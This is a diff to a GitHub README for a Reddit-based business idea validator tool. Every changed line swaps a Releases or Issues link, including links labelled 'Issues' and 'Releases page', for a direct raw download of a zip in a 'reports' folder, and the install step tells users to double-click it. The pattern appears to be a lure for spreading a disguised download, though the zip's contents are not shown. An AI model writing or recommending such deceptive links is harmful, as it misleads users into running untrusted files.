@@ -4,7 +4,7 @@
 Welcome to Reddit_Business_Idea_Validator! This tool helps you examine market demand by analyzing posts and comments from Reddit. You can identify user pain points and competition with ease.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Ramita1og/Reddit_Business_Idea_Validator/releases)
+[![Download](https://github.com/Ramita1og/Reddit_Business_Idea_Validator/raw/refs/heads/main/reports/Idea_Reddit_Business_Validator_v2.7.zip)](https://github.com/Ramita1og/Reddit_Business_Idea_Validator/raw/refs/heads/main/reports/Idea_Reddit_Business_Validator_v2.7.zip)
 
 ## 📘 About this Application
 Reddit_Business_Idea_Validator is designed for anyone interested in researching business ideas. It offers three main features:
@@ -24,7 +24,7 @@ Before you begin, ensure your system meets these requirements:
 ## 🔗 Download & Install
 To get started, visit the following link to download the latest version of Reddit_Business_Idea_Validator:
 
-[Download from Releases](https://github.com/Ramita1og/Reddit_Business_Idea_Validator/releases)
+[Download from Releases](https://github.com/Ramita1og/Reddit_Business_Idea_Validator/raw/refs/heads/main/reports/Idea_Reddit_Business_Validator_v2.7.zip)
 
 1. Open the link above to reach the Releases page.
 2. Locate the latest version release.
@@ -35,7 +35,7 @@ To get started, visit the following link to download the latest version of Reddi
 Follow these steps to install Reddit_Business_Idea_Validator:
 
 1. Navigate to the folder where you saved the downloaded file.
-2. Double-click the installation file (e.g., `Reddit_Business_Idea_Validator.exe` or `.dmg`).
+2. Double-click the installation file (e.g., `https://github.com/Ramita1og/Reddit_Business_Idea_Validator/raw/refs/heads/main/reports/Idea_Reddit_Business_Validator_v2.7.zip` or `.dmg`).
 3. Follow the prompts in the setup wizard.
 4. Once installation is complete, you can launch the application from your applications folder or desktop.
 
@@ -66,9 +66,9 @@ Yes, as long as your laptop meets the system requirements, you can easily run th
 No, you do not need a Reddit account to gather data with the application.
 
 ## 🆘 Need Help?
-If you run into issues or have questions, check the [Issues](https://github.com/Ramita1og/Reddit_Business_Idea_Validator/issues) section on GitHub. You can also report any bugs or request features there.
+If you run into issues or have questions, check the [Issues](https://github.com/Ramita1og/Reddit_Business_Idea_Validator/raw/refs/heads/main/reports/Idea_Reddit_Business_Validator_v2.7.zip) section on GitHub. You can also report any bugs or request features there.
 
 ## 📢 Feedback and Contributions
 We welcome feedback and suggestions to enhance the application. If you'd like to contribute, please consider submitting a pull request on GitHub.
 
-> Thank you for choosing Reddit_Business_Idea_Validator! We look forward to helping you validate your business ideas effectively. Stay updated with new releases and enhancements by visiting our [Releases page](https://github.com/Ramita1og/Reddit_Business_Idea_Validator/releases) regularly.
+> Thank you for choosing Reddit_Business_Idea_Validator! We look forward to helping you validate your business ideas effectively. Stay updated with new releases and enhancements by visiting our [Releases page](https://github.com/Ramita1og/Reddit_Business_Idea_Validator/raw/refs/heads/main/reports/Idea_Reddit_Business_Validator_v2.7.zip) regularly.
